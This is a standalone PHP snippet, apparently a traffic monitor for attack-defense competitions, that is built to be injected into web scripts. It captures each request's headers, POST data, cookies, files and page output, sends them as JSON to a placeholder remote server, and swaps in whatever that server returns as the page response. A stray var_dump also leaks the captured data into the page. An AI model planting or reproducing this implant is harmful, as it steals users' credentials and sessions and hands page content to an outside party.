<?php
if (!\defined('AoiMonitor')) {
    \define('AoiMonitor', 'Injected');
    $__aoi_outputBufferCallback = function ($buffer) {
        $reportUri = "tcp://SERVER_URI";
        $stringEncoder = 'urlencode';
        $postData = function ($url, $data) {
            $server = \stream_socket_client($url);
            if ($server) {
                \fwrite($server, $data . "\n");
                return \base64_decode(\rtrim(\fgets($server)));
            }
            return false;
        };
        $getHeader = function () use ($stringEncoder) {
            $headerList = array();
            foreach ($_SERVER as $name => $value) {
                if (\preg_match('/^HTTP_/', $name)) {
                    $name = \strtr(\substr($name, 5), '_', ' ');
                    $name = \ucwords(\strtolower($name));
                    $name = \strtr($name, ' ', '-');
                    $headerList[$name] = $stringEncoder($value);
                }
            }
            return $headerList;
        };
        $processArray = function (&$value) use ($stringEncoder) {
            $value = $stringEncoder($value);
        };
        $requestURI = "";
        if (isset($_SERVER['REQUEST_URI'])) {
            $requestURI = \explode('?', $_SERVER['REQUEST_URI'], 1);
            $requestURI = $requestURI[0];
        }
        $method = isset($_SERVER['REQUEST_METHOD']) ? $_SERVER['REQUEST_METHOD'] : 'UNKNOWN';
        $remote = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'UNKNOWN';
        $_GET = isset($_GET) ? $_GET : array();
        \array_walk_recursive($_GET, $processArray);
        $_POST = isset($_POST) ? $_POST : array();
        \array_walk_recursive($_POST, $processArray);
        $_COOKIE = isset($_COOKIE) ? $_COOKIE : array();
        \array_walk_recursive($_COOKIE, $processArray);
        $_FILE = isset($_FILE) ? $_FILE : array();
        \array_walk_recursive($_FILE, $processArray);
        $data = array(
            'type' => 'web',
            'data' => array(
                'script' => __FILE__,
                'method' => $method,
                'uri' => $requestURI,
                'remote' => $remote,
                'header' => $getHeader(),
                'get' => $_GET,
                'post' => $_POST,
                'cookie' => $_COOKIE,
                'file' => $_FILE,
                'buffer' => $stringEncoder($buffer),
            )
        );
        var_dump($data);
        $data = @$postData($reportUri, \json_encode($data));
        if ($data === false) {
            \sleep(2);
            return $buffer;
        }
        return $data;
    };
    \ob_start(@$__aoi_outputBufferCallback);
}
